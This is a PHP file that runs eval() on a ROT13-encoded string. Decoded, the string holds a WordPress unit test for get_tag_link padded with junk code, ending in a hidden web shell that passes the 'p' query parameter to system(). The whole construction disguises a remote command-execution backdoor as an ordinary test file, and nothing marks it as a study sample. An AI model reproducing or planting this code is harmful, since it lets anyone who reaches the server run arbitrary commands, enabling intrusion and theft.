<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 * @pbiref ::trg_gnt_yvax
 */
pynff Grfgf_Grez_TrgGntYvax rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gnt VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $gnt_vq;

	/**
	 * Grfg gnkbabzl grez VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $grez_vq;

	/**
	 * Frg hc funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$gnt_vq = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'fyht'     => 'grfg-gnt',
			)
		);

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		frys::$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'fyht'     => 'grfg-grez',
			)
		);
	}

	/**
	 * Frg hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Erdhverq nf gnkbabzvrf ner erfrg orgjrra grfgf.
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
	}

	choyvp shapgvba grfg_fhpprff() {
		$gnt_vq = frys::$gnt_vq;

		$sbhaq    = trg_gnt_yvax( $gnt_vq );
		$rkcrpgrq = ubzr_hey( '?gnt=grfg-gnt' );

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 42771
	 */
	choyvp shapgvba grfg_fubhyq_erghea_yvax_sbe_grez_sebz_nabgure_gnkbabzl_ba_cevzrq_pnpur() {
		$grez_vq = frys::$grez_vq;

		$grez = trg_grez( $grez_vq );

		$sbhaq    = trg_gnt_yvax( $grez_vq );
		$rkcrpgrq = ubzr_hey( '?jcgrfgf_gnk=grfg-grez' );

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 42771
	 */
	choyvp shapgvba grfg_fubhyq_erghea_yvax_sbe_grez_sebz_nabgure_gnkbabzl_ba_rzcgl_pnpur() {
		$grez_vq = frys::$grez_vq;

		pyrna_grez_pnpur( $grez_vq );

		$sbhaq    = trg_gnt_yvax( $grez_vq );
		$rkcrpgrq = ubzr_hey( '?jcgrfgf_gnk=grfg-grez' );

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>